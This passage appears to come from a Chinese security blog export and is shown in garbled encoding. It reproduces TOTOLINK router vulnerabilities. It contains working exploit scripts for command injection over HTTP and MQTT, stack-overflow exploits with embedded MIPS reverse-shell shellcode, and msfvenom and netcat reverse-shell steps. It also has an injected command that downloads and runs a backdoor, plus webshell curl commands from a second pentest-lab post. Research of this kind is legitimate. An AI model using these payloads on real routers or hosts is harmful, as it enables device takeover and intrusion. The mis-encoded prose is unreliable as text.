å®¢æˆ·ç«¯å¯¹æ¯”](https://www.emqx.com/zh/blog/comparision-of-python-mqtt-client)\n\n[å¦‚ä½•åœ¨ Python ä¸­ä½¿ç”¨ MQTT](https://www.emqx.com/zh/blog/how-to-use-mqtt-in-python)\n\n```python\nimport paho.mqtt.client as mqtt\n\nclient = mqtt.Client()\nclient.connect(\"192.168.55.1\",1883,60)\nclient.publish('totolink/router/setting/setTelnetCfg',payload='{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}')\n```\n\n# å†æŒ–æŒ–å§\n\n## æŒ–ä¸€ä¸ªcs_subä¸­soåº“çš„å‘½ä»¤æ³¨å…¥\n\nåœ¨lib/cste_modules/global.soä¸­æ‰¾åˆ°å¦‚ä¸‹å‘½ä»¤æ³¨å…¥æ¼æ´ï¼š\n\n```c\nint __fastcall setLanguageCfg(int a1, int a2, int a3)\n{\n Â const char *v6; // $s2\n Â char v8[260]; // [sp+18h] [-104h] BYREF\n\n Â memset(v8, 0, 0x100u);\n Â v6 = (const char *)websGetVar(a2, \"langType\", \"\");\n Â apmib_set(6002, v6);\n Â if ( !fork() )\n  {\n Â  Â sleep(1u);\n Â  Â apmib_update_web(4);\n Â  Â exit(1);\n  }\n Â CsteSystem(\"rm -rf /var/js/language* 1>/dev/null 2>&1\", 0);\n Â sprintf(v8, \"cp /web_cste/js/language_%s.js /var/js/language.js\", v6);\n Â CsteSystem(v8, 0);        //å‘½ä»¤æ³¨å…¥\n Â CsteSystem(\"ln -s /var/js/language.js /web_cste/js/language.js 1>/dev/null 2>&1\", 0);\n Â websSetCfgResponse(a1, a3, \"0\", \"reserv\");\n Â return 0;\n}\n```\n\næœ‰ä¸¤ç§æ–¹å¼è§¦å‘è¯¥æ¼æ´ï¼š\n\n- é€šè¿‡80å£çš„httpæœåŠ¡\n\n  ```python\n  import requests\n  \n  response = requests.post(\"http://192.168.55.1/cgi-bin/cstecgi.cgi\",data='{\"topicurl\":\"setting/setLanguageCfg\",\"langType\":\";echo 123 > /tmp/xy.txt;\"}')\n  ```\n\n- é€šè¿‡1883å£çš„mqttæœåŠ¡\n\n  ```python\n  import paho.mqtt.client as mqtt\n  \n  client = mqtt.Client()\n  client.connect(\"192.168.55.1\",1883,60)\n  client.publish('totolink/router/setting/setLanguageCfg',payload='{\"topicurl\":\"setting/setLanguageCfg\",\"langType\":\";echo 123 > /tmp/tmp.txt;\"}')\n  ```\n\nä»¥ä¸Šä¸¤ç§æ–¹å¼ï¼Œå‡å¯ä»å¦‚ä¸‹ä¸‰ä¸ªæ–¹å‘è¿›ä¸€æ­¥åˆ©ç”¨ï¼š\n\n1. æŠŠlsç­‰å…³é”®æ³„éœ²ä¿¡æ¯ï¼Œå†™å…¥åˆ°é€šè¿‡80å£å¯è®¿é—®çš„æ–‡ä»¶ä¸­\n\n   åªéœ€å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœé‡å®šå‘åˆ°`/web_cste`ç›®å½•ä¸‹çš„æŸä¸ªæ–°å»ºæ–‡ä»¶ï¼ˆå¦‚`ls > /web_cste/ls.txt`ï¼‰ï¼Œç„¶ååœ¨æµè§ˆå™¨ä¸­é€šè¿‡`https://192.168.55.1/ls.txt`å°±å¯ä»¥æŸ¥çœ‹`ls`å‘½ä»¤çš„æ‰§è¡Œç»“æœäº†ã€‚\n\n2. åå¼¹shell\n\n   æœªå®Œæˆtag\n\n3. å¼€telnet\n\n   å…·æœ‰å‘½ä»¤æ³¨å…¥èƒ½åŠ›ä¹‹åï¼Œå¼€å¯telnetå°±å¾ˆç®€å•äº†ï¼Œåªä¸è¿‡éœ€è¦æ³¨æ„ä¸€ä¸‹`&`è¿™ä¸ªç‰¹æ®Šå­—ç¬¦ã€‚æœ€åæ˜¯é€šè¿‡`#`çš„æ³¨é‡ŠåŠŸèƒ½æ‰“æˆåŠŸçš„ã€‚expå¦‚ä¸‹ï¼š\n\n   ```python\n   import requests\n   response = requests.post(\"http://192.168.55.1/cgi-bin/cstecgi.cgi\",data='{\"topicurl\":\"setting/setLanguageCfg\",\"langType\":\";telnetd & #;\"}')\n   ```\n\n   å¦å¤–ï¼Œtelnetdçš„ä½¿ç”¨æ–¹æ³•è¿™é‡Œè¿˜æœ‰ç‚¹è¿·ï¼Œä½¿ç”¨`telnetd &`å¯ä»¥åœ¨totolinkè·¯ç”±å™¨ä¸­å°†æœåŠ¡èµ·èµ·æ¥ï¼Œä½†æ˜¯æˆ‘è‡ªå·±çš„ubuntuè™šæ‹Ÿæœºä¸­å´ä¸è¡Œï¼Œæš‚æ—¶è¿˜æ²¡å¼„æ˜ç™½å•¥åŸå› ã€‚è®°ä¸€ä¸ªæœªå®Œæˆtagã€‚\n\n## æŒ–ä¸€ä¸ªcs_subä¸­soåº“çš„æ ˆæº¢å‡º\n\næ‰¾åˆ°çš„æ ˆæº¢å‡ºç‚¹è®°å½•ï¼š\n\n```\nfirewall.so - setIpPortFilterRules()å‡½æ•° - ç¬¬72/73è¡Œ - v11\nfirewall.so - setMacFilterRules()å‡½æ•° - ç¬¬87/88è¡Œ - v10\nfirewall.so - setUrlFilterRules()å‡½æ•° - ç¬¬32/33è¡Œ - v9\nfirewall.so - setParentalRules()å‡½æ•° - ç¬¬43/44è¡Œ - v9\nfirewall.so - setPortForwardRules()å‡½æ•° - ç¬¬55è¡Œ - v13\nfirewall.so - setIpQosRules()å‡½æ•° - ç¬¬34è¡Œ - v12\nfirewall.so - setMacQos()å‡½æ•° - ç¬¬41/46è¡Œ - v12\n\nglobal.so - setLanguageCfg()å‡½æ•° - ç¬¬16è¡Œ - v6\n```\n\næˆ‘æŒ‘äº†å…¶ä¸­çš„ä¸€ä¸ªæ¼æ´ç‚¹è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œå¦‚ä¸‹ã€‚\n\n### filewall.soåº“ä¸­setIpQosRuleså‡½æ•°\n\næ¼æ´ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š\n\n```c\nint __fastcall setIpQosRules(int a1, int a2, int a3)\n{\n  ......\n  char v14[23]; // [sp+18h] [-B8h] BYREF\n  ......\n  v12 = (const char *)websGetVar(a2, \"comment\", &byte_9268);\n\t......\n  strcpy(v14, v12);\n  apmib_set(131385, v14);\n  apmib_set(65848, v14);\n  apmib_update_web(4);\n  system(\"sysconf firewall\");\n  websSetCfgResponse(a1, a3, \"0\", \"reserv\");\n  return 0;\n}\n```\n\n`strcpy(v14,v12)`æ‹·è´æ—¶å¯èƒ½ä¼šå¯¼è‡´v14æº¢å‡ºï¼Œè¯¥æ¼æ´æ‰€åœ¨å‡½æ•°çš„åŠŸèƒ½ç®€å•ï¼Œæ— æ¼æ´åˆ©ç”¨é™åˆ¶æ¡ä»¶ï¼Œå› æ­¤åˆ©ç”¨èµ·æ¥è¾ƒä¸ºç®€å•ã€‚\n\nï¼ˆ1ï¼‰é€šè¿‡80å£è¿›è¡Œæ”»å‡»\n\né€šè¿‡80å£å‘é€åˆ©ç”¨è„šæœ¬ï¼Œå¹¶åœ¨mqtt.fxä¸­è®¢é˜…æ‰€æœ‰æ¶ˆæ¯ã€‚ä½†æ˜¯åŠ ä¸Šshellcodeçš„è„šæœ¬æ€»æ˜¯æ— æ³•åˆ°è¾¾mqttæœåŠ¡èŠ‚ç‚¹ï¼ŒçŒœæµ‹æ˜¯å› ä¸ºshellcodeä¸­æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œåœ¨é€”ä¸­è¢«æ‹¦æˆªäº†ã€‚æ‰€ä»¥è€ƒè™‘é€šè¿‡mqttæœåŠ¡çš„1883å£æ‰“ã€‚\n\nï¼ˆ2ï¼‰é€šè¿‡1883å£è¿›è¡Œæ”»å‡»\n\nä»è¿™ä¸ªå£å‘é€æ˜¯å¯ä»¥çš„ã€‚ä¸è¿‡ï¼Œè¿˜æ˜¯é‡åˆ°äº†ä»¥ä¸‹ä¸¤ä¸ªå‘ï¼š\n\n- `\\x00`æˆªæ–­ï¼Œ4å­—èŠ‚å˜æˆ3å­—èŠ‚ï¼ˆä¸èƒ½ç”¨p32æ„é€ ï¼‰ï¼Œå·§å¦™åˆ©ç”¨strcpyå‡½æ•°ä¼šåœ¨æ‹·è´ç»“æŸåŠ `\\x00`\n- shellcodeå¦‚æœå¸ƒç½®åœ¨testæ‰€åœ¨åŒºé—´ï¼Œç”±äºshellcodeä¸­å¼•å·çš„å­˜åœ¨ï¼Œjsonè§£ææ—¶ä¼šæŠŠæˆ‘ä»¬çš„shellcodeæˆªæ–­ï¼Œä»è€Œæ— æ³•è¦†ç›–åˆ°å‡½æ•°è¿”å›åœ°å€ã€‚ä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæˆ‘ä»¬åœ¨èŠ±æ‹¬å·`{}` åæ¤å…¥shellcodeï¼ˆè™½ç„¶è¿™æ®µshellcodeä¸ä¼šè¢«å½“åšjsonçš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯è¯¥è¿›ç¨‹æ¥æ”¶äº†è¿™äº›å­—ç¬¦ï¼Œé‚£ä¹ˆè¿™ä¸€æ®µshellcodeå°±å¿…ç„¶åœ¨è¿›ç¨‹å†…å­˜ä¸­ï¼Œåªè¦æŸä¸ªæ—¶æ®µè¿™ä¸€å†…å­˜åŒºé—´æœªè¢«è¦†ç›–ï¼Œæˆ‘ä»¬å°±èƒ½ret2shellcodeï¼‰ã€‚å­—ç¬¦ä¸²\"bling\"æ˜¯æ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œshellcodeå®šä½ç”¨çš„ï¼Œåœ¨æŸæ¬¡è°ƒè¯•ä¸­ï¼Œå®šä½åˆ°shellcode(buf)çš„èµ·å§‹åœ°å€ä¸º0x4143b4ï¼Œå› æ­¤æœ‰å¦‚ä¸‹åˆ©ç”¨è„šæœ¬ã€‚\n\nexpå¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\nimport paho.mqtt.client as mqtt\n\nbuf = \"\\xfa\\xff\\x0f\\x24\\x27\\x78\\xe0\\x01\\xfd\\xff\\xe4\\x21\\xfd\"\nbuf += \"\\xff\\xe5\\x21\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24\\x0c\\x01\"\nbuf += \"\\x01\\x01\\xff\\xff\\xa2\\xaf\\xff\\xff\\xa4\\x8f\\xfd\\xff\\x0f\"\nbuf += \"\\x34\\x27\\x78\\xe0\\x01\\xe2\\xff\\xaf\\xaf\\x0d\\x05\\x0e\\x3c\"\nbuf += \"\\x0d\\x05\\xce\\x35\\xe4\\xff\\xae\\xaf\\x37\\x05\\x0e\\x3c\\xc0\"\nbuf += \"\\xa8\\xce\\x35\\xe6\\xff\\xae\\xaf\\xe2\\xff\\xa5\\x27\\xef\\xff\"\nbuf += \"\\x0c\\x24\\x27\\x30\\x80\\x01\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\"\nbuf += \"\\x01\\xfd\\xff\\x11\\x24\\x27\\x88\\x20\\x02\\xff\\xff\\xa4\\x8f\"\nbuf += \"\\x21\\x28\\x20\\x02\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\"\nbuf += \"\\xff\\x10\\x24\\xff\\xff\\x31\\x22\\xfa\\xff\\x30\\x16\\xff\\xff\"\nbuf += \"\\x06\\x28\\x62\\x69\\x0f\\x3c\\x2f\\x2f\\xef\\x35\\xec\\xff\\xaf\"\nbuf += \"\\xaf\\x73\\x68\\x0e\\x3c\\x6e\\x2f\\xce\\x35\\xf0\\xff\\xae\\xaf\"\nbuf += \"\\xf4\\xff\\xa0\\xaf\\xec\\xff\\xa4\\x27\\xf8\\xff\\xa4\\xaf\\xfc\"\nbuf += \"\\xff\\xa0\\xaf\\xf8\\xff\\xa5\\x27\\xab\\x0f\\x02\\x24\\x0c\\x01\"\nbuf += \"\\x01\\x01\"\n\ntest = \"a\"*218\n\nclient = mqtt.Client()\nclient.connect(\"192.168.55.1\",1883,60)\nclient.publish('totolink/router/setting/setIpQosRules',payload='{\"topicurl\":\"setting/setIpQosRules\",\"comment\":\"xx'+test+'\\xb4\\x43\\x41\"}'+'bling'+buf)\n```\n\nps. ä½¿ç”¨kaliç”Ÿæˆshellcodeçš„æ–¹æ³•å¦‚ä¸‹ï¼Œéœ€è¦æŒ‡å®šæ”»å‡»æœºçš„ ipå’Œportï¼š\n\n```bash\nmsfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.55.5 LPORT=2333 -f py -o mipsel919.txt\n```\n\nps. æ‰§è¡Œæ”»å‡»è„šæœ¬å‰ï¼Œéœ€è¦åœ¨æ”»å‡»æœºä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”¨æ¥æ¥æ”¶åå¼¹çš„shellï¼š\n\n```bash\nnc -l 2333\n```\n\n### upgrade.soåº“ä¸­slaveUpgradeå‡½æ•°\n\næ¼æ´ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š\n\n```c\nint __fastcall slaveUpgrade(int a1, int a2, int a3)\n{\n\t......\n  char v13[128]; // [sp+18h] [-C0h] BYREF\n  char v14[64]; // [sp+98h] [-40h] BYREF\n  ......\n  if ( getValFromTmp(\"slaveUpgradeflag\") != 1 )\n  {\n    v7 = (const char *)websGetVar(a2, \"url\", \"\");\n    strcat(v14, v7);\n    ......\n  }\n  ......\n  return 0;\n}\n```\n\n`strcat(v14, v7)`å°†v7çš„å†…å®¹è·Ÿv14è¿æ¥åï¼Œä¼šå¯¼è‡´v14æº¢å‡ºã€‚æ ¹æ®å‰æ–‡â€œfilewall.soåº“ä¸­setIpQosRuleså‡½æ•°â€å°èŠ‚ä¸­çš„åˆ©ç”¨æ–¹æ³•ï¼Œè¿™ä¸ªæ´çš„è°ƒè¯•å’Œåˆ©ç”¨è·Ÿå®ƒå¾ˆç›¸ä¼¼ã€‚\n\nè¿™æ¬¡ï¼Œæˆ‘ä»¬å°è¯•ç”¨ä¸€ä¸ªè„šæœ¬åšä¸¤ä»¶äº‹ï¼ˆä¸éœ€è¦é¢å¤–å¼€ä¸ªçª—å£æ‰§è¡Œ`nc -l 2333`ï¼‰ï¼Œå®Œæ•´expå¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\nimport paho.mqtt.client as mqtt\nimport threading\n\nbuf = \"\\xfa\\xff\\x0f\\x24\\x27\\x78\\xe0\\x01\\xfd\\xff\\xe4\\x21\\xfd\"\nbuf += \"\\xff\\xe5\\x21\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24\\x0c\\x01\"\nbuf += \"\\x01\\x01\\xff\\xff\\xa2\\xaf\\xff\\xff\\xa4\\x8f\\xfd\\xff\\x0f\"\nbuf += \"\\x34\\x27\\x78\\xe0\\x01\\xe2\\xff\\xaf\\xaf\\x09\\x1d\\x0e\\x3c\"\nbuf += \"\\x09\\x1d\\xce\\x35\\xe4\\xff\\xae\\xaf\\x37\\x03\\x0e\\x3c\\xc0\"\nbuf += \"\\xa8\\xce\\x35\\xe6\\xff\\xae\\xaf\\xe2\\xff\\xa5\\x27\\xef\\xff\"\nbuf += \"\\x0c\\x24\\x27\\x30\\x80\\x01\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\"\nbuf += \"\\x01\\xfd\\xff\\x11\\x24\\x27\\x88\\x20\\x02\\xff\\xff\\xa4\\x8f\"\nbuf += \"\\x21\\x28\\x20\\x02\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\"\nbuf += \"\\xff\\x10\\x24\\xff\\xff\\x31\\x22\\xfa\\xff\\x30\\x16\\xff\\xff\"\nbuf += \"\\x06\\x28\\x62\\x69\\x0f\\x3c\\x2f\\x2f\\xef\\x35\\xec\\xff\\xaf\"\nbuf += \"\\xaf\\x73\\x68\\x0e\\x3c\\x6e\\x2f\\xce\\x35\\xf0\\xff\\xae\\xaf\"\nbuf += \"\\xf4\\xff\\xa0\\xaf\\xec\\xff\\xa4\\x27\\xf8\\xff\\xa4\\xaf\\xfc\"\nbuf += \"\\xff\\xa0\\xaf\\xf8\\xff\\xa5\\x27\\xab\\x0f\\x02\\x24\\x0c\\x01\"\nbuf += \"\\x01\\x01\"\npayload1 = \"a\"*84\npayload1 += \"\\x28\\x43\\x41\"\n\ndef local_listen():\n    l = listen(2333)\n    l.wait_for_connection()\n    l.interactive()\n\ndef send_payload():\n    client = mqtt.Client()\n    client.connect(\"192.168.55.1\",1883,60)\n    client.publish('totolink/router/setting/slaveUpgrade',payload='{\"topicurl\":\"setting/slaveUpgrade\",\"url\":\"'+payload1+'\"}'+'blingha'+buf)\n\nt1 = threading.Thread(target=local_listen)\nt2 = threading.Thread(target=send_payload)\n\nt1.start()\nt2.start()\n```\n\n\n\n# å…¶ä»–\n\n## åè¿shell\n\nä¸ºäº†æ‹¿åˆ°ç›®æ ‡ç³»ç»Ÿçš„shellï¼Œæœ‰æ—¶å€™éœ€è¦å¾€ç›®æ ‡ç³»ç»Ÿä¸­æ¤å…¥åé—¨ï¼Œè®©å…¶å°†shellè¿”å›åˆ°æˆ‘ä»¬æœ¬åœ°ç³»ç»Ÿä¸­ã€‚\n\næœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯åˆ©ç”¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå¦ä¸€ç§æ˜¯é€šè¿‡å†…å­˜æ¼æ´æ§åˆ¶æ‰§è¡Œæµã€‚\n\n### å‘½ä»¤æ³¨å…¥\n\nåˆ†å››æ­¥ï¼š\n\n- ç”Ÿæˆbackdoor\n\n  ä½¿ç”¨metasploitä¸­çš„msfvenomç”Ÿæˆä¸€ä¸ªç›®æ ‡ç³»ç»Ÿæ¶æ„çš„backdooræ–‡ä»¶ï¼ŒåŠŸèƒ½æ˜¯åè¿shell\n\n  ```bash\n  â”Œâ”€â”€(blingã‰¿kali)-[~]\n  â””â”€$ msfvenom --list payloads | grep mipsle\n      linux/mipsle/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space.\n      linux/mipsle/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker\n      linux/mipsle/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\n      linux/mipsle/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\n      linux/mipsle/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\n      linux/mipsle/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.\n      linux/mipsle/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker\n      linux/mipsle/shell_bind_tcp                         Listen for a connection and spawn a command shell\n      linux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a command shell\n  \n  â”Œâ”€â”€(blingã‰¿kali)-[~]\n  â””â”€$ msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=127.0.0.1 LPORT=2333 -f elf -o test-mipsel\n  ```\n\n- æœ¬åœ°èµ·httpæœåŠ¡\n\n  å‚è€ƒï¼š[Python SimpleHTTPServer](https://www.cnblogs.com/nopnog/p/8116848.html)\n\n  æœåŠ¡ç«¯æ‰§è¡Œï¼š`python -m SimpleHTTPServer`ï¼Œé»˜è®¤ç›‘å¬æœ¬åœ°8000ç«¯å£\n\n  å®¢æˆ·ç«¯ï¼š`wget http://ip:8000/xxx`æˆ–ç›´æ¥è®¿é—®`http://ip:8000/`\n\n- æœ¬åœ°ç›‘å¬\n\n  ä½¿ç”¨ `nc -l [port]` åœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”¨äºç»™backdoorè¿æ¥\n\n- å‘½ä»¤æ³¨å…¥\n\n  å¾€ç›®æ ‡ç³»ç»Ÿæ³¨å…¥å¦‚ä¸‹å‘½ä»¤ï¼š`;wget backdoor;chmod +x backdoor;./backdoor;`\n\n### å†…å­˜æ¼æ´\n\nåˆ†ä¸‰æ­¥ï¼š\n\n- ç”Ÿæˆshellcode\n\n  ä½¿ç”¨metasploitä¸­çš„msfvenomç”Ÿæˆä¸€ä¸ªshellcodeï¼ŒåŠŸèƒ½æ˜¯åè¿shell\n\n  ```bash\n  â”Œâ”€â”€(blingã‰¿kali)-[~]\n  â””â”€$ msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=127.0.0.1 LPORT=2333 -f py -o test-mipsel.txt\n  # ä¸æŒ‡å®š-få‚æ•°çš„è¯ï¼Œç”Ÿæˆäº†ä¸€ä¸ªshellcodeäºŒè¿›åˆ¶æ–‡ä»¶ã€‚æŒ‡å®š-f pyç”Ÿæˆçš„æ–‡ä»¶ï¼Œæ–¹ä¾¿å†™è„šæœ¬ä½¿ç”¨ã€‚\n  ```\n\n- æœ¬åœ°ç›‘å¬\n\n  ä½¿ç”¨ `nc -l [port]` åœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”¨äºshellcodeè¿æ¥\n\n- ret2shellcode\n\n  æ„é€ åˆ©ç”¨è„šæœ¬ï¼Œè§¦å‘å†…å­˜æ¼æ´ï¼Œæ§åˆ¶åŠ«æŒæµæ‰§è¡Œshellcode\n\n## gdbserverçš„ä½¿ç”¨\n\ngdbserveréœ€è¦æ­é…gdbä¸€èµ·ä½¿ç”¨ï¼Œgdbserverè¿è¡Œåœ¨å¾…æµ‹ç³»ç»Ÿå†…éƒ¨ï¼Œgdbè¿è¡Œåœ¨æˆ‘ä»¬æœ¬åœ°ã€‚\n\né¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦è®©gdbserverè·Ÿå¾…æµ‹è¿›ç¨‹å»ºç«‹è”ç³»ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š\n\n- ç¬¬ä¸€ç§æ–¹æ³•ï¼Œä½¿ç”¨gdbserverå¯åŠ¨ç¨‹åºï¼Œå¹¶è®¾ç½®ä¸€ä¸ªç«¯å£ç”¨äºè·Ÿgdbå»ºç«‹è¿æ¥\n\n  ```bash\n  $ ./gdbserver :1234 /target/exec/\n  ```\n\n- ç¬¬äºŒç§æ–¹æ³•ï¼Œä½¿ç”¨ `â€”attach` é€‰é¡¹é™„åŠ åˆ°æŸä¸ªå·²å¯åŠ¨è¿›ç¨‹ï¼Œé™„åŠ ä¸Šå»åç¨‹åºä¼šæ–­åœ¨å½“å‰è¿è¡ŒæŒ‡ä»¤å¤„\n\n  ```bash\n  $ ./gdbserver :1234 --attach [pid]\n  ```\n\nç„¶åï¼Œè®©gdbè·Ÿgdbserverå»ºç«‹è¿æ¥ï¼Œè¿™é‡Œéœ€è¦æ ¹æ®å¾…æµ‹è¿›ç¨‹çš„æ¶æ„é€‰æ‹©gdbæˆ–gdb-multiarchï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š\n\n- ç¬¬ä¸€ç§æƒ…å†µï¼Œx86æˆ–x86_64æ¶æ„ä½¿ç”¨gdb\n\n  ```bash\n  $ gdb  \n  ......\n  gef > target remote [ip]:[port]\n  \n  # æˆ–\n  $ gdb -q /target/exec\n  ......\n  gef > target remote [ip]:[port]\n  ```\n\n- ç¬¬äºŒç§æƒ…å†µï¼Œarm/mipsç­‰å…¶ä»–æ¶æ„ä½¿ç”¨gdb-multiarch\n\n  ```bash\n  $ gdb-multiarch\n  ......\n  gef > set architecture [arm/mips/...]\n  gef > set endian little \n  gef > target remote [ip]:[port]\n  \n  # æˆ–è€…ï¼Œå°†ä»¥ä¸Šä¸‰æ¡å‘½ä»¤å†™åˆ°æ–‡ä»¶ä¸­ï¼Œç„¶åç›´æ¥ä½¿ç”¨gdbçš„\"-x\"å‚æ•°æŒ‡å®šé…ç½®æ–‡ä»¶\n  \n  $ gdb-multiarch -q /target/exec -x xxx.cfg\n  ......\n  gef > \n  ```\n\n## mountå‘½ä»¤\n\n```shell\nmount -o loop /fakefolder /realfoler\numount /realfolder\n\nmount -o bind /fakefile /realfile\numount /realfile\n```\n\n## make_elf\n\nshellcodeå˜æˆelfçš„äºŒç§æ–¹å¼ï¼š\n\n1. ç”¨pwntoolsä¸­make_elfï¼ˆè¾ƒç®€å•ï¼‰\n2. å†™ä¸€ä¸ªmainå‡½æ•°ï¼Œç”¨äº¤å‰ç¼–è¯‘ç¼–æˆä¸åŒå¹³å°çš„äºŒè¿›åˆ¶ï¼ˆè¾ƒéº»çƒ¦ï¼‰\n\n## å®šä½æ¼æ´å‡½æ•°æ‰€åœ¨çš„è¿›ç¨‹\n\nè°ƒè¯•cstecgi.cgiæ—¶å¯èƒ½ä¼šé¢ä¸´è¿™ä¸ªé—®é¢˜\n\n## lighttpd\n\n...\n\n## ä¸²å£æ‹¿shell\n\n...\n\n","tags":["totolink","gdbserver","mqtt","è·¯ç”±å™¨"],"categories":["æ¼æ´å¤ç°"]},{"title":"ç½‘ç»œæ¸—é€çš„åŸºæœ¬æŠ€èƒ½","url":"/2021/08/09/basic-skills-of-pen-test/","content":"\n\n\n# é¶åœºç¯å¢ƒ\n\n```\nkaliï¼š192.168.125.130\nwin7ï¼š192.168.52.143/192.168.125.129\nwindows2003ï¼š192.168.52.141\nwindows2008ï¼š192.168.52.138\n```\n\npost curl\n\n```\ncurl -d \"x=system('dir');\" http://192.168.125.129/she.php\n```\n\nget åœ°å€æ \n\n```\n192.168.125.129/she.php?x=system(%27whoami%27);\n```\n\n\n\n\n\n# è™šæ‹Ÿæœºç½‘ç»œçš„ä¸‰ç§æ¨¡å¼\n\nå¯¹äºå®¿ä¸»æœºä¸è™šæ‹Ÿæœºä¹‹é—´çš„ç½‘ç»œåŒ¹é…æ¨¡å¼ï¼ŒVMwareä¸­ä¸€å…±æœ‰ä¸‰ç§ï¼šNATï¼Œä»…ä¸»æœºï¼Œæ¡¥æ¥ã€‚\n\n## NATæ¨¡å¼\n\nNATï¼Œå³ç½‘ç»œåœ°å€è½¬æ¢NATæ¨¡å¼åœ¨å®¿ä¸»æœºä¸Šè¡¨ç°ä¸ºVMnet8è™šæ‹Ÿç½‘å¡ã€‚åœ¨è™šæ‹Ÿæœºå†…æ‰§è¡Œ`route print`æˆ–`route`ä¼šçœ‹åˆ°ä¸¤æ¡è·¯ç”±è¡¨ã€‚\n\n```\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\ndefault         192.168.150.2   0.0.0.0         UG    100    0        0 eth0\n192.168.150.0   0.0.0.0         255.255.255.0   U     100    0        0 eth0\n```\n\nNATæ¨¡å¼ä»¥hostä¸»æœºï¼ˆ192.168.150.1ï¼‰ä½œä¸ºç½‘å…³ï¼Œvmwareæ›¿hostä¸»æœºå®ç°äº†ä¸€ä¸ªNATåŠŸèƒ½ï¼ˆ192.168.150.2ï¼‰ï¼Œå› æ­¤è™šæ‹Ÿæœºé€šè¿‡hostä¸»æœºè¿›è¡Œç½‘ç»œåœ°å€è½¬æ¢åï¼Œä»¥hostä¸»æœºçš„ipåœ°å€å‘å¤–éƒ¨ipå‘èµ·è¿æ¥ã€‚æ­¤æ—¶å¯ä»¥æŠŠhostä¸»æœºçœ‹ä½œæˆ‘ä»¬å®¶é‡Œç”¨çš„è·¯ç”±å™¨ã€‚\n\n## ä»…ä¸»æœºæ¨¡å¼\n\nä»…ä¸»æœºæ¨¡å¼åœ¨å®¿ä¸»æœºä¸Šè¡¨ç°ä¸ºVMnet1è™šæ‹Ÿç½‘å¡ã€‚åœ¨è™šæ‹Ÿæœºå†…æ‰§è¡Œ`route print`æˆ–`route`åªä¼šçœ‹åˆ°ä¸€æ¡è·¯ç”±è¡¨ã€‚\n\n```\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n192.168.125.0   0.0.0.0         255.255.255.0   U     100    0        0 eth0\n```\n\nè¿™é‡Œåˆ†ä¸¤ç§æƒ…å†µï¼š\n\n- 1ã€å°†è™šæ‹Ÿæœºç½‘ç»œè¿æ¥åˆ°ä¸»æœºè™šæ‹Ÿé€‚é…å™¨ã€‚æ­¤æ—¶è™šæ‹Ÿæœºå¯ä»¥pingé€šåŒä¸€ç½‘æ®µçš„å…¶ä»–ä¸»æœºï¼Œå› å…¶ä»¥192.168.125.1ä½œä¸ºç½‘å…³ï¼Œä¸”èƒ½pingé€šã€‚ï¼ˆè¿™é‡Œæˆ‘ç†è§£ä¸ºhostä¸»æœºä¸ç»™è™šæ‹Ÿæœºæä¾›NATåŠŸèƒ½äº†ï¼Œä½†æ˜¯ç”±äºè™šæ‹Ÿæœºç½‘ç»œè¿åˆ°äº†hostä¸»æœºç½‘ç»œä¸Šï¼Œå› æ­¤å¯ä»¥åœ¨ä»¥hostä¸»æœºä¸ºç½‘å…³ä¸”ç½‘ç»œå·ç›¸åŒçš„ä¸»æœºä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚ç›¸å½“äºå½¢æˆäº†ä¸€ä¸ªå°å‹å±€åŸŸç½‘ï¼‰\n- 2ã€å–æ¶ˆå°†è™šæ‹Ÿæœºç½‘ç»œè¿æ¥åˆ°ä¸»æœºè™šæ‹Ÿé€‚é…å™¨ã€‚æ­¤æ—¶åœ¨è™šæ‹Ÿæœºå†…æ— æ³•pingé€šä»»ä½•å…¶ä»–ä¸»æœºæˆ–ç½‘å…³ï¼Œç›¸å½“äºä¸€å°æ²¡æœ‰æ¥ç½‘çº¿æ²¡æœ‰è¿wifiï¼Œå› æ­¤è·Ÿå¤–ç•Œæ²¡æœ‰ä»»ä½•é€šä¿¡çš„ä¸»æœºã€‚\n\n## 